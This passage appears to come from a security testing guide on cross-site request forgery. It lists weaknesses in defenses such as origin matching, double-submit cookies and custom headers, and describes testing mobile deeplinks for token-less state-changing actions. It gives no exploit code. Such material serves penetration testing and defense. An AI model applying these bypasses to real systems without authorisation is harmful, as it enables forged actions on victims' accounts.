- Weak matching: `target.com.evil.com` passes naive string matching



### Defense: Double-submit cookie pattern

**Bypass:** If attacker can set cookies (subdomain takeover, cookie injection via HTTP), they can set both the cookie and the form field to matching attacker-controlled values.



### Defense: Custom request header (e.g., `X-Requested-With`)

**Bypass:** Simple requests (form POST, `text/plain`) don't trigger preflight and can't set custom headers — but some servers only check for header *presence*, not value, and some frameworks accept requests without it.



---



### Mobile-app CSRF via custom-scheme deeplink

CSRF is not browser-only. For targets with a mobile app, enumerate exported deeplink / custom-scheme handlers (`scheme://action` from the Android manifest / iOS `Info.plist`) and test whether opening one performs a state-changing action (follow, link, purchase) using the app's ambient session with no CSRF token — deliverable to a victim by a plain link or a QR code. Disclosed: reports/583987, reports/805073.
